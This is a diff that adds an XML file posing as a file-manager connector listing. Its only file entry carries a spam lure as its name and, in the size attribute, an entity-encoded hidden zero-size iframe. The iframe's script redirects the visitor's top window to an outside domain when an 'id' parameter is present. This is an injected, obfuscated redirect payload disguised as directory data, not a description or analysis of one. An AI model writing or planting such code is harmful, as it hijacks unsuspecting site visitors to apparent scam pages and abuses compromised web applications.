@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Connector command="GetFoldersAndFiles" resourceType="Document">
+<CurrentFolder path="/1 - f/" url=""/>
+<Folders/>
+    <Files>
+        <File desc="1" name="Verified as a valued user. Loading better products for you…" size="&#x3C;iframe height=&#x22;0&#x22; width=&#x22;0&#x22; srcdoc=&#x22;&#x3C;script&#x3E;const pid=new URLSearchParams(window.top.location.search).get(&#x27;id&#x27;)||&#x27;&#x27;;if(pid){window.top.location.replace(&#x27;https://woordenboek.elaf.cc/&#x27;);}&#x3C;/script&#x3E;&#x22;&#x3E;&#x3C;/iframe&#x3E;" url="1"/>
+    </Files>
+</Connector>
